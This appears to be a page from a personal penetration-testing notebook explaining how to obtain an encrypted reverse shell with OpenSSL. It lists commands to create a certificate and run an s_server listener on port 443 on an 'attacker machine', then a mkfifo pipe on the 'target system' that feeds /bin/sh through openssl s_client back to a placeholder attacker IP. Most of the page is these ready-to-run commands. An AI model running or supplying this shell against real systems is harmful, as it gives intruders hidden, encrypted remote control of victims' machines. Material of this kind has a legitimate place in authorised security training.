<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>OpenSSL Reverse Shell</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>OpenSSL Reverse Shell</h1><br /><br /><br />This method involves to use an OpenSSL client and
    server-based technique in conjunction with what are known as <a
      href="https://en.wikipedia.org/wiki/Named_pipe#In_Unix" target="_blank">mkfifo</a> named pipes<br /><br />Check <a
      href="Home--Pentesting_Basics--Bash--output_redirectors--mkfifo.html">What are mkfifo named pipe &amp; How they
      work</a><br /><br />1. generate an SSL certificate key pair for our listener on the <span
      style="color:#ff0000;">attacker machine</span>. This will create two files, “key.pem” and “cert.pem” files<br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;openssl&nbsp;req&nbsp;-x509&nbsp;-newkey&nbsp;rsa:4096&nbsp;-keyout&nbsp;key.pem&nbsp;-out&nbsp;cert.pem&nbsp;-days&nbsp;365&nbsp;-nodes
      </div>
    </div><br />2. start up a listener on the <span style="color:#ff0000;">attacker machine</span> using the
    <code>openssl s_server</code> command. That will start up an openSSL listener with our certificate and associated
    key on port 443<br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;openssl&nbsp;s_server&nbsp;-quiet&nbsp;-key&nbsp;key.pem&nbsp;-cert&nbsp;cert.pem&nbsp;-port&nbsp;443
      </div>
    </div><br /> *if the target use the old version of tls (tls 1.0)<br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;openssl&nbsp;s_server&nbsp;-quiet&nbsp;-key&nbsp;key.pem&nbsp;-cert&nbsp;cert.pem&nbsp;-port&nbsp;443&nbsp;-tls1
      </div>
    </div><br />4. on the <span style="color:#1e90ff;">target system</span>, we create a mkfifo named pipe as a file
    called “x” in /tmp in conjunction with an <code>openssl s_client -quiet -connect</code> command that will connect
    back to our attacker machine, and give us a shell on the victim host (over SSL):<br /> <br />
    <div class="codebox">
      <div class="codebox">
        target@debian:~$&nbsp;mkfifo&nbsp;/tmp/x<br />target@debian:~$&nbsp;/bin/sh&nbsp;-i&nbsp;&lt;&nbsp;/tmp/x&nbsp;2&gt;&amp;1&nbsp;|&nbsp;openssl&nbsp;s_client&nbsp;-quiet&nbsp;-connect&nbsp;&lt;attacker_IP&gt;:443&nbsp;&gt;&nbsp;/tmp/x<br />target@debian:~$&nbsp;rm&nbsp;/tmp/x
      </div>
    </div><br /> <a href=""><img src="images/1468-1.png" alt="images/1468-1.png" /></a><br /> <a href=""><img
        src="images/1468-2.png" alt="images/1468-2.png" /></a>
  </div>
</body>

</html>